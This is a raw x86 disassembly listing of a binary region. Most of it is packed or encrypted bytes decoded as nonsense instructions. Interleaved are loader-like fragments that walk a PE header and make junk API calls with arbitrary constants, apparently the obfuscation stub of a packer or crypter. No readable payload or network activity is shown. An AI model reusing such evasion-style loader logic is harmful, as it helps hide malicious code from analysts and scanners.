  4111ec:	xchg   edi,eax
  4111ed:	push   ebp
  4111ee:	frstor [edx-0x16]
  4111f1:	fld    TBYTE PTR [edx]
  4111f3:	out    dx,al
  4111f4:	icebp  
  4111f5:	fnstcw WORD PTR [esi]
  4111f7:	xchg   esi,eax
  4111f8:	aas    
  4111f9:	fcmovne st,st(5)
  4111fb:	ror    DWORD PTR [ecx+0x74d9607a],1
  411201:	adc    BYTE PTR [edi+0x23],ch
  411204:	mov    cl,0xfa
  411206:	in     eax,dx
  411207:	mov    bl,0xeb
  411209:	cmp    ebx,esp
  41120b:	or     esi,esi
  41120d:	mov    ebx,0xbe05ce94
  411212:	pop    ss
  411213:	cmc    
  411214:	sub    eax,0x771d53b9
  411219:	inc    ebx
  41121a:	sub    esp,DWORD PTR [ebx+0x4d97b905]
  411220:	scas   al,BYTE PTR es:[edi]
  411221:	lock (bad) 
  411223:	jp     0x411201
  411225:	push   0x9ec95f0a
  41122a:	jmp    0x41125a
  41122c:	pop    esp
  41122d:	adc    al,0x8
  41122f:	icebp  
  411230:	pusha  
  411231:	add    BYTE PTR [ecx-0x5],0x14
  411235:	int3   
  411236:	out    dx,eax
  411237:	inc    ecx
  411238:	and    eax,DWORD PTR [esi]
  41123a:	call   0x81aa2b52
  41123f:	call   0xaab9:0xed9e0027
  411246:	bound  ecx,QWORD PTR [edx-0x2b89bcfe]
  41124c:	jmp    0x41128a
  41124e:	shl    DWORD PTR [edi-0x48],0xd
  411252:	mov    DWORD PTR [edx],edx
  411254:	jno    0x4112b0
  411256:	add    eax,DWORD PTR [ebp+edi*2-0x2656dfaa]
  41125d:	hlt    
  41125e:	pop    esp
  41125f:	pop    ebp
  411260:	ficomp DWORD PTR [esi+0x74]
  411263:	js     0x4112df
  411265:	int3   
  411266:	cli    
  411267:	add    al,0x39
  41126a:	xchg   BYTE PTR gs:[edi+0x53],bl
  41126e:	adc    BYTE PTR [ebx+0x53d223df],0xdb
  411275:	mov    ebx,0xc4bdd8ba
  41127a:	into   
  41127b:	or     ecx,edi
  41127d:	icebp  
  41127e:	loope  0x411271
  411280:	inc    esi
  411281:	pop    ebp
  411282:	xchg   edi,eax
  411283:	adc    BYTE PTR [ecx+0x38],dh
  411286:	mov    BYTE PTR [edi+0x2df1e528],ah
  41128c:	xchg   DWORD PTR [edi],ebx
  41128e:	dec    edx
  41128f:	popa   
  411290:	inc    ebp
  411291:	cli    
  411292:	sub    cl,al
  411294:	hlt    
  411295:	push   eax
  411296:	jle    0x4112a5
  411298:	inc    esp
  411299:	dec    edx
  41129a:	aas    
  41129b:	(bad)  
  41129c:	mov    esi,0x51c411a5
  4112a1:	or     BYTE PTR ds:0x7ba4708e,al
  4112a7:	das    
  4112a8:	or     eax,0xf88b244e
  4112ad:	jnp    0x41124d
  4112af:	lods   eax,DWORD PTR ds:[esi]
  4112b0:	pop    esp
  4112b1:	sbb    DWORD PTR [edi+edi*1+0x4a],eax
  4112b5:	lds    eax,FWORD PTR [ecx]
  4112b7:	adc    eax,eax
  4112b9:	data16 out dx,al
  4112bb:	stos   BYTE PTR es:[edi],al
  4112bc:	push   0xffffffbe
  4112be:	addr16 push cs
  4112c0:	xor    ebx,eax
  4112c2:	pusha  
  4112c3:	(bad)  
  4112c4:	mov    bh,0xb5
  4112c6:	dec    ecx
  4112c7:	nop
  4112c8:	mov    edi,0xb7c1466a
  4112cd:	les    ebx,FWORD PTR [eax+0x29720aa1]
  4112d3:	pop    esi
  4112d4:	inc    ebx
  4112d5:	iret   
  4112d6:	arpl   WORD PTR [ecx-0x3],bp
  4112d9:	cmc    
  4112da:	and    al,0x70
  4112dc:	add    DWORD PTR [esi-0x9dde03f],0x70
  4112e3:	sbb    edx,ebx
  4112e5:	cmp    eax,0xfe840faa
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x9868f61e,eax
  411318:	(bad)  
  411319:	push   ebx
  41131a:	cmovns eax,DWORD PTR [ebp+0x7e]
  41131e:	jle    0x4112cf
  411320:	jl     0x4113a0
  411322:	jle    0x411339
  411324:	mov    DWORD PTR [edi],0x43e229e9
  41132a:	or     ch,BYTE PTR cs:[ebp-0x682aabbf]
  411331:	jmp    0x3772:0x37e94e6e
  411338:	mov    WORD PTR [ebp+esi*8-0x63],gs
  41133c:	fnsave [ecx+0x272d2f01]
  411342:	mov    eax,0xd1f638ff
  411347:	pushf  
  411348:	pop    ebx
  411349:	adc    ecx,DWORD PTR [esi-0x24]
  41134c:	das    
  41134d:	lods   al,BYTE PTR ds:[esi]
  41134e:	fstp   QWORD PTR [esi]
  411350:	jmp    0xb1ff:0x4fd6bcd2
  411357:	lahf   
  411358:	xor    eax,0xa227a0f3
  41135d:	(bad)  
  41135e:	dec    BYTE PTR [esi-0x1c]
  411361:	fucomp st(5)
  411363:	add    DWORD PTR [ecx+0x2],ebp
  411366:	mov    cl,0xdb
  411368:	retf   0x9ec5
  41136b:	outs   dx,BYTE PTR ds:[esi]
  41136c:	xor    ah,BYTE PTR [ebp+0x12]
  41136f:	xchg   ecx,eax
  411370:	mov    ah,0x34
  411372:	mov    esi,edi
  411374:	cmp    eax,0x784bdb7d
  411379:	outs   dx,DWORD PTR ds:[esi]
  41137a:	push   ds
  41137b:	mov    dh,0x27
  41137d:	cmc    
  41137e:	inc    ecx
  41137f:	ss nop
  411381:	div    BYTE PTR [edx+0x26]
  411384:	jp     0x41133a
  411386:	and    DWORD PTR [ecx-0x5e899f5f],ebp
  41138c:	mov    ds:0x4c3b01bf,eax
  411391:	fwait
  411392:	scas   al,BYTE PTR es:[edi]
  411393:	shl    DWORD PTR [edx+0x3b],1
  411396:	push   edx
  411397:	pusha  
  411398:	sub    eax,0x6ce76078
  41139d:	fnstcw WORD PTR [esi+0xf]
  4113a0:	imul   ebx,ebp,0x1a56e369
  4113a6:	cld    
  4113a7:	(bad)  
  4113a8:	stc    
  4113a9:	loope  0x4113d1
  4113ab:	call   0x3551:0xd3f38fea
  4113b2:	mov    ah,0x1d
  4113b4:	(bad)  
  4113b5:	(bad)  
  4113b6:	push   esp
  4113b7:	mov    cl,0x19
  4113b9:	mov    eax,ds:0xa715ccce
  4113be:	jmp    0x1708:0xd0e4667d
  4113c5:	inc    eax
  4113c6:	sub    dh,BYTE PTR fs:[ecx]
  4113c9:	ins    BYTE PTR es:[edi],dx
  4113ca:	and    al,0x15
  4113cc:	icebp  
  4113cd:	pop    edi
  4113ce:	cmp    DWORD PTR ds:0x21d816ed,eax
  4113d4:	(bad)  
  4113d5:	push   ebx
  4113d6:	cmp    cl,BYTE PTR [ecx-0x30df00ea]
  4113dc:	leave  
  4113dd:	adc    al,0xe0
  4113df:	popa   
  4113e0:	xor    si,WORD PTR ds:0x1ee4e754
  4113e7:	jbe    0x411441
  4113e9:	mov    edi,0x8a4dcfe9
  4113ee:	pop    edi
  4113ef:	jl     0x4113ac
  4113f1:	adc    BYTE PTR [ecx-0x41b09ed4],dl
  4113f7:	push   edi
  4113f8:	bound  edx,QWORD PTR [esi]
  4113fa:	nop
  4113fb:	push   ss
  4113fc:	pop    ecx
  4113fd:	lds    ecx,FWORD PTR [esi+0x386121b3]
  411403:	add    BYTE PTR [eax],0xf8
  411406:	fdiv   QWORD PTR [eax+0x3]
  411409:	xchg   esi,eax
  41140a:	mov    ch,0x1
  41140c:	fist   WORD PTR [ecx-0x1d]
  41140f:	pop    ds
  411410:	rol    BYTE PTR [bp+di],0xdb
  411414:	pop    es
  411415:	pop    eax
  411416:	jp     0x4113e5
  411418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411419:	cwde   
  41141a:	add    BYTE PTR [edx-0x6e30bba6],dl
  411420:	mov    DWORD PTR [esi],esp
  411422:	and    al,0xf7
  411424:	dec    ebp
  411425:	shl    DWORD PTR [ecx+0x37217561],1
  41142b:	cmp    ebp,DWORD PTR [edx]
  41142d:	jmp    0x8a9d18e
  411432:	pop    es
  411433:	inc    ecx
  411434:	jnp    0x411488
  411436:	push   ebx
  411437:	push   0x55
  411439:	stos   DWORD PTR es:[edi],eax
  41143a:	pop    edi
  41143b:	ds inc ecx
  41143d:	repz clc 
  41143f:	cli    
  411440:	int    0x98
  411442:	jecxz  0x4114ac
  411444:	jecxz  0x41143e
  411446:	jle    0x411496
  411448:	add    ch,ah
  41144a:	cli    
  41144b:	push   0x74
  41144d:	or     eax,0xe7c8d221
  411452:	aad    0x83
  411454:	aam    0xd2
  411456:	mov    dl,0x81
  411458:	jb     0x4113e8
  41145a:	xchg   edx,eax
  41145b:	cmp    dh,dh
  41145d:	mov    bl,0xa
  41145f:	xchg   ebp,eax
  411460:	neg    DWORD PTR [edi]
  411462:	sbb    DWORD PTR [ecx-0x57959c31],edi
  411468:	or     BYTE PTR [edi+0x13767bc4],cl
  41146e:	fiadd  WORD PTR [ebp+0x7e]
  411471:	pop    ds
  411472:	stos   DWORD PTR es:[edi],eax
  411473:	xor    dh,BYTE PTR [ebx+0x167402e3]
  411479:	mov    ds:0xda987b0f,al
  41147e:	push   0x62
  411480:	loop   0x411420
  411482:	enter  0x9e19,0x1c
  411486:	in     eax,0xd5
  411488:	fld    QWORD PTR [edi-0x63]
  41148b:	pop    ebp
  41148c:	dec    edx
  41148d:	into   
  41148e:	repnz into 
  411490:	or     ebx,DWORD PTR [edx]
  411492:	(bad)  
  411493:	scas   al,BYTE PTR es:[edi]
  411494:	mov    bl,0xb4
  411496:	lods   eax,DWORD PTR ds:[esi]
  411497:	add    ch,BYTE PTR [eax+0xb3e4778]
  41149d:	call   FWORD PTR [edx+0x4a]
  4114a0:	and    al,0x31
  4114a2:	dec    edx
  4114a3:	dec    ebp
  4114a4:	mov    ds:0x8c6522ca,al
  4114a9:	inc    esi
  4114aa:	dec    edx
  4114ab:	lods   eax,DWORD PTR ds:[esi]
  4114ac:	jp     0x41143f
  4114ae:	pop    edx
  4114af:	sub    BYTE PTR ds:0x3355a3cf,0xab
  4114b6:	scas   al,BYTE PTR es:[edi]
  4114b7:	test   eax,0x7a0f5c31
  4114bc:	mov    eax,0x7d7f04c2
  4114c1:	lahf   
  4114c2:	(bad)  
  4114c4:	sbb    esi,DWORD PTR [ebp+edi*2+0xc1a0ffe]
  4114cb:	xchg   DWORD PTR [ecx-0x36],edi
  4114ce:	imul   ebp,DWORD PTR [ecx],0xf0ff8f2f
  4114d4:	mov    DWORD PTR [edx],edi
  4114d6:	out    dx,al
  4114d7:	test   eax,0x19d6faef
  4114dc:	jmp    0x411545
  4114de:	ret    
  4114df:	mov    ds:0xcb3d89e7,al
  4114e4:	pop    esp
  4114e5:	aas    
  4114e6:	cmc    
  4114e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e8:	jb     0x4114ac
  4114ea:	ret    
  4114eb:	(bad)  
  4114ec:	mov    dl,0x54
  4114ee:	popa   
  4114ef:	mov    ecx,0xf73638c0
  4114f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114f5:	fcomi  st,st(2)
  4114f7:	fimul  WORD PTR [esi-0xbd9e1b8]
  4114fd:	frstor [edi-0x5b]
  411500:	sub    DWORD PTR [ebp+0x3c266d73],esi
  411506:	jnp    0x4114b9
  411508:	xor    eax,0x667b1bbd
  41150d:	sbb    al,0x93
  41150f:	js     0x4114f3
  411511:	hlt    
  411512:	and    al,0x7f
  411514:	push   0x8345dd35
  411519:	xchg   edx,eax
  41151a:	call   0x40f4:0x20e88da7
  411521:	cli    
  411522:	imul   ebp,edx,0x4dcff315
  411528:	xor    eax,0x87a472d7
  41152d:	daa    
  41152e:	mov    fs,esi
  411530:	imul   eax,DWORD PTR [edx+0x7cd277bb],0x73fc973c
  41153a:	push   esp
  41153b:	dec    ebp
  41153c:	aad    0x19
  41153e:	dec    eax
  41153f:	and    dh,BYTE PTR [edx-0x4e15b05]
  411545:	xor    edi,DWORD PTR ds:0x35069af1
  41154b:	jl     0x4114f0
  41154d:	out    0x74,eax
  41154f:	js     0x4114e7
  411551:	jecxz  0x411504
  411553:	les    ebx,FWORD PTR [esi+0x6b]
  411556:	aad    0x41
  411558:	pop    ebp
  411559:	lahf   
  41155a:	mov    bh,0xba
  41155c:	out    0xe1,al
  41155e:	(bad)  
  41155f:	aaa    
  411560:	dec    esi
  411561:	add    al,0x3a
  411563:	inc    esp
  411564:	jae    0x411571
  411566:	es pop ds
  411568:	test   DWORD PTR [eax-0x1ec70c15],edi
  41156e:	lahf   
  41156f:	sar    eax,cl
  411571:	cmp    eax,0xe9e65065
  411576:	mov    al,ds:0xd744d1ff
  41157b:	inc    ebp
  41157c:	xchg   edx,eax
  41157d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41157e:	(bad)  
  41157f:	dec    ebp
  411580:	and    eax,0x1dfab586
  411585:	inc    edx
  411586:	jmp    0x6a89f3a3
  41158b:	iret   
  41158c:	jns    0x4115c1
  41158e:	jmp    0x41159f
  411590:	mov    BYTE PTR [edx+0x13],ch
  411593:	mov    ecx,0x28c1fa83
  411598:	(bad)  
  411599:	out    dx,eax
  41159a:	sti    
  41159b:	and    eax,0xd1312fc8
  4115a0:	mov    al,ds:0xde6e754b
  4115a5:	outs   dx,BYTE PTR ds:[si]
  4115a7:	jae    0x411606
  4115a9:	mov    BYTE PTR [edi-0x76c452c2],0xd0
  4115b0:	xor    DWORD PTR [ecx],esp
  4115b2:	retf   
  4115b3:	push   cs
  4115b4:	or     DWORD PTR [ebp-0x37],0xc1ac4890
  4115bb:	sbb    edx,DWORD PTR [esi+0x29]
  4115be:	add    BYTE PTR [edi-0xb872945],al
  4115c4:	xchg   DWORD PTR [ebx+0x16],ecx
  4115c7:	dec    ebx
  4115c8:	loop   0x4115b0
  4115ca:	mov    ebp,ds
  4115cc:	sbb    ebx,DWORD PTR [esi]
  4115ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115cf:	sahf   
  4115d0:	lahf   
  4115d1:	shl    ebx,1
  4115d3:	sbb    cl,BYTE PTR [ebx-0x3eccf7ab]
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	adc    DWORD PTR [edx+0xd],eax
  41161b:	ret    
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x411634
  411625:	add    edx,eax
  411627:	cli    
  411628:	je     0x41169f
  41162a:	retf   0x4100
  41162d:	fisub  DWORD PTR [ebp-0x31]
  411630:	jmp    0xf808:0xa39e3b58
  411637:	fidivr DWORD PTR [ebx-0x2acab9c3]
  41163d:	enter  0xb404,0xbd
  411641:	call   0xc48a7237
  411646:	cld    
  411647:	ret    0x23e2
  41164a:	cs adc bh,dl
  41164d:	add    edi,ecx
  41164f:	div    eax
  411651:	pop    eax
  411652:	test   BYTE PTR [ecx+ebp*2-0x46],0x1b
  411657:	or     edx,ecx
  411659:	inc    ebp
  41165a:	or     al,0xa2
  41165c:	or     al,0x36
  41165e:	cs mov si,0x53b3
  411663:	hlt    
  411664:	cwde   
  411665:	(bad)  
  411666:	pushf  
  411667:	test   al,0xa0
  411669:	or     BYTE PTR [esi+0x61],bl
  41166c:	jl     0x41165c
  41166e:	mov    ecx,0xcb512254
  411673:	xor    al,0xfe
  411675:	fild   DWORD PTR ds:0xa6e7cb16
  41167b:	ja     0x411669
  41167d:	xor    dl,ch
  41167f:	push   ds
  411680:	xchg   ecx,eax
  411681:	push   esi
  411682:	dec    ebx
  411683:	(bad)  
  411684:	aas    
  411685:	sbb    DWORD PTR [edi+0x2c311a13],ecx
  41168b:	cmp    al,0x64
  41168d:	sbb    eax,0xc9bed792
  411692:	out    0x42,al
  411694:	dec    edi
  411695:	push   esp
  411696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411697:	cmp    DWORD PTR [edi],ecx
  411699:	mov    bh,0x2
  41169b:	repz push eax
  41169d:	adc    DWORD PTR [edx+edi*8-0x4b],edi
  4116a1:	div    BYTE PTR [ebx]
  4116a3:	int    0x17
  4116a5:	xchg   esi,eax
  4116a6:	ret    0xa830
  4116a9:	sub    al,0xe5
  4116ab:	out    dx,al
  4116ac:	mov    esp,0x69d83208
  4116b1:	jmp    0x4122:0x55a1ce9c
  4116b8:	fisttp WORD PTR [esi+0x633e7bc6]
  4116be:	xchg   ebx,eax
  4116bf:	loope  0x4116e4
  4116c1:	leave  
  4116c2:	fstp   DWORD PTR [ebx+0x5ce38fb]
  4116c8:	xor    eax,0xb866d85a
  4116cd:	cdq    
  4116ce:	pop    edi
  4116cf:	jnp    0xd356caa1
  4116d5:	iret   
  4116d6:	cmp    ch,BYTE PTR [edi+0x0]
  4116d9:	mov    cs,ebx
  4116db:	push   edi
  4116dc:	(bad)  
  4116dd:	mov    ch,0x0
  4116df:	or     DWORD PTR [ebp-0x3ff994d8],esp
  4116e5:	sbb    ch,BYTE PTR ss:[ecx-0x15]
  4116e9:	sub    BYTE PTR [ebx],0x54
  4116ec:	arpl   WORD PTR [edx+ebp*2],ax
  4116ef:	push   ebp
  4116f0:	adc    edx,DWORD PTR [eax-0x515c05de]
  4116f6:	ror    BYTE PTR [esi+0x6a],cl
  4116f9:	xchg   edx,eax
  4116fa:	xchg   esi,eax
  4116fb:	adc    DWORD PTR [ecx],0xa11f637e
  411701:	lods   al,BYTE PTR ds:[esi]
  411702:	cmc    
  411703:	cmp    BYTE PTR [eax-0x6e798135],dl
  411709:	test   DWORD PTR [esi-0x4bdf5e1a],edx
  41170f:	repz xchg bx,ax
  411712:	neg    esi
  411714:	test   al,0xbc
  411716:	add    al,0x68
  411718:	dec    esp
  411719:	fdivr  QWORD PTR [ebp-0x614f360f]
  41171f:	repz mov ?,di
  411723:	stos   BYTE PTR es:[edi],al
  411724:	popf   
  411725:	jge    0x411792
  411727:	mov    dh,al
  411729:	pop    ecx
  41172a:	push   0x8735a692
  41172f:	rol    BYTE PTR [ebp+0x18],0x26
  411733:	repnz test DWORD PTR [edi+0x4a],ebp
  411737:	sub    BYTE PTR ds:0x8bf235f7,0x79
  41173e:	mov    eax,ds:0xe6ba92d2
  411743:	mov    DWORD PTR [ebx+0x67],esi
  411746:	sbb    ch,BYTE PTR [ebp+0x3a080d8e]
  41174c:	sub    al,0x8d
  41174e:	xchg   BYTE PTR ds:0x75313170,al
  411754:	das    
  411755:	sub    eax,DWORD PTR [esi]
  411757:	add    eax,DWORD PTR [eax-0x3a06cf53]
  41175d:	dec    edx
  41175e:	dec    esp
  41175f:	mov    dl,0xfb
  411761:	xchg   DWORD PTR [ebx],ebx
  411763:	push   0x1e8536de
  411768:	xor    DWORD PTR [esi+0x3],ebp
  41176b:	std    
  41176c:	cdq    
  41176d:	out    0x35,eax
  41176f:	js     0x4117f0
  411771:	aam    0xf0
  411773:	test   eax,0x1d8fc6b8
  411778:	jge    0x4117c5
  41177a:	in     al,0x23
  41177c:	imul   ecx,DWORD PTR [esi],0xdc35a2a6
  411782:	jge    0x4117f7
  411784:	mov    ebp,DWORD PTR [ecx-0x77dbab2c]
  41178a:	test   eax,0xb8315713
  41178f:	push   esp
  411790:	out    dx,al
  411791:	pop    es
  411792:	in     eax,dx
  411793:	pop    eax
  411794:	cli    
  411795:	in     al,0x50
  411797:	inc    edx
  411798:	and    dh,BYTE PTR [eax]
  41179a:	mov    ch,0xcb
  41179c:	out    dx,al
  41179d:	fdivr  st(0),st
  41179f:	ret    
  4117a0:	inc    eax
  4117a1:	mov    cl,BYTE PTR [edx+0x35]
  4117a4:	nop
  4117a5:	push   edx
  4117a6:	mov    cl,0x97
  4117a8:	cmp    al,cl
  4117aa:	xchg   DWORD PTR [edx-0x77],ebx
  4117ad:	es xor edi,eax
  4117b0:	sub    BYTE PTR [ebp+0x77fe8561],ch
  4117b6:	and    edi,DWORD PTR [ebx]
  4117b8:	jmp    0x41181e
  4117ba:	test   al,0xc6
  4117bc:	add    DWORD PTR [edx],eax
  4117be:	pop    esp
  4117bf:	push   edx
  4117c0:	push   ss
  4117c1:	mov    dh,0xe6
  4117c3:	ficomp WORD PTR [ecx]
  4117c5:	leave  
  4117c6:	into   
  4117c7:	pop    ebp
  4117c8:	aad    0x85
  4117ca:	mov    esi,0x8bca1dff
  4117cf:	inc    ebp
  4117d0:	or     bh,al
  4117d2:	add    eax,0x433823
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x43377f2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	ret    
  4118e8:	inc    edx
  4118e9:	(bad)  [edx+0x2c]
  4118ec:	dec    esi
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411911
  4118f4:	scas   al,BYTE PTR es:[edi]
  4118f5:	aaa    
  4118f6:	aas    
  4118f7:	outs   dx,BYTE PTR ds:[esi]
  4118f8:	data16 std 
  4118fa:	pusha  
  4118fb:	(bad)  
  4118fc:	out    dx,al
  4118fd:	test   DWORD PTR [edi-0x28be09d0],0x20a1a7f6
  411907:	mov    dh,0x3b
  411909:	aas    
  41190a:	gs call 0x6ae0b20
  411910:	cmp    al,0xfc
  411912:	ja     0x4118e9
  411914:	addr16 pop esp
  411916:	push   ecx
  411917:	fsubp  st(3),st
  411919:	shl    edx,1
  41191b:	fisttp WORD PTR [edi-0x4ff0b8d0]
  411921:	clc    
  411922:	push   esp
  411923:	add    al,0x79
  411925:	shr    DWORD PTR [ecx-0x375fab42],cl
  41192b:	mov    ds:0x8a7f5007,al
  411930:	pop    eax
  411931:	arpl   WORD PTR [edi],sp
  411933:	clc    
  411934:	test   al,0x71
  411936:	dec    ebp
  411937:	loop   0x4119b3
  411939:	push   ss
  41193a:	js     0x411970
  41193c:	stos   BYTE PTR es:[edi],al
  41193d:	pop    ebx
  41193e:	mov    bl,0x49
  411940:	mov    ebx,0x41db51af
  411945:	xchg   ebx,eax
  411946:	ins    DWORD PTR es:[edi],dx
  411947:	js     0x4119a9
  411949:	jnp    0x411929
  41194b:	add    eax,0x19f7371e
  411950:	mov    dl,0x7e
  411952:	adc    eax,0x81f5acbd
  411957:	mov    ch,0xf3
  411959:	popa   
  41195a:	(bad)  
  41195b:	sbb    esi,DWORD PTR [ebx]
  41195d:	retf   0x5f59
  411960:	jg     0x41195b
  411962:	pop    edi
  411963:	xchg   edx,eax
  411964:	(bad)  
  411965:	fbld   TBYTE PTR [eax+0x5f]
  411968:	mov    esp,0xe5cf1365
  41196d:	mov    ah,0x99
  41196f:	pop    eax
  411970:	(bad)  
  411971:	cwde   
  411972:	jae    0x4119b6
  411974:	stc    
  411975:	push   0x4a6197fe
  41197a:	imul   ecx,edx,0xffffffec
  41197d:	test   BYTE PTR [ecx+0x1346e465],0x60
  411984:	mov    ebx,0x9f30b988
  411989:	or     eax,0xf675d89c
  41198e:	iret   
  41198f:	and    BYTE PTR [edx-0x3c],dl
  411992:	pop    ss
  411993:	dec    ecx
  411994:	cmp    edi,ebp
  411996:	pop    esp
  411997:	aas    
  411998:	mov    fs,WORD PTR [edi]
  41199a:	pop    ds
  41199b:	sti    
  41199c:	loopne 0x4119eb
  41199e:	xchg   ebp,edx
  4119a0:	int3   
  4119a1:	sti    
  4119a2:	les    edx,FWORD PTR [esi-0x6a]
  4119a5:	jns    0x411948
  4119a7:	(bad)  
  4119a8:	mov    DWORD PTR ds:[ecx],ecx
  4119ab:	adc    al,0x89
  4119ad:	cmp    DWORD PTR [ecx+0x2d],ebx
  4119b0:	cmp    ebx,DWORD PTR [ecx-0x148172c4]
  4119b6:	jecxz  0x4119f7
  4119b8:	mov    eax,0xcc636583
  4119bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119be:	mov    ecx,0xb0f675fa
  4119c3:	iret   
  4119c4:	retf   0x8518
  4119c7:	or     ch,BYTE PTR [eax]
  4119c9:	pusha  
  4119ca:	push   ebx
  4119cb:	scas   eax,DWORD PTR es:[edi]
  4119cc:	or     edx,DWORD PTR [ecx+0x4e]
  4119cf:	xlat   BYTE PTR ds:[ebx]
  4119d0:	jge    0x4119e9
  4119d2:	(bad)  
  4119d3:	sbb    WORD PTR [edx],0xff8b
  4119d7:	rcr    al,1
  4119d9:	aas    
  4119da:	or     DWORD PTR [eax+0xa],0xffffffaa
  4119de:	and    al,0x32
  4119e0:	add    eax,DWORD PTR [ecx-0x1dcfa8ff]
  4119e6:	pop    es
  4119e7:	push   0x291209d1
  4119ec:	xor    al,0x73
  4119ef:	iret   
  4119f0:	aad    0xf2
  4119f2:	mov    bl,0x74
  4119f4:	lea    esi,[ecx-0x15]
  4119f7:	add    BYTE PTR [ebx],bh
  4119f9:	xor    BYTE PTR ds:[edx+edi*4],al
  4119fd:	out    0x60,eax
  4119ff:	idiv   esi
  411a01:	ret    
  411a02:	or     ebx,ebp
  411a04:	add    edi,DWORD PTR [edx+0x7e27ab53]
  411a0a:	jp     0x411a82
  411a0c:	inc    eax
  411a0d:	and    DWORD PTR [esi+ebx*2+0xd],ebp
  411a11:	push   bx
  411a13:	imul   ebp,DWORD PTR [ecx],0xffffff84
  411a16:	xor    eax,edx
  411a18:	dec    eax
  411a19:	mov    dh,0x7d
  411a1b:	xor    eax,0x3d129b84
  411a20:	xchg   esi,eax
  411a21:	xor    esp,DWORD PTR [edi+0x13]
  411a24:	inc    ebx
  411a25:	fld    DWORD PTR [ebx+0x58d89f71]
  411a2b:	or     dh,BYTE PTR [edi-0x2af5c342]
  411a31:	push   edx
  411a32:	sub    al,0xac
  411a34:	xchg   edx,eax
  411a35:	and    DWORD PTR [edx],ecx
  411a37:	lahf   
  411a38:	push   cs
  411a39:	les    ebp,FWORD PTR [edi+0x47d74409]
  411a3f:	aad    0xf2
  411a41:	lahf   
  411a42:	mov    ecx,DWORD PTR [eax+0x48]
  411a45:	lods   al,BYTE PTR ds:[esi]
  411a46:	dec    esi
  411a47:	int3   
  411a48:	or     eax,0x83e9692a
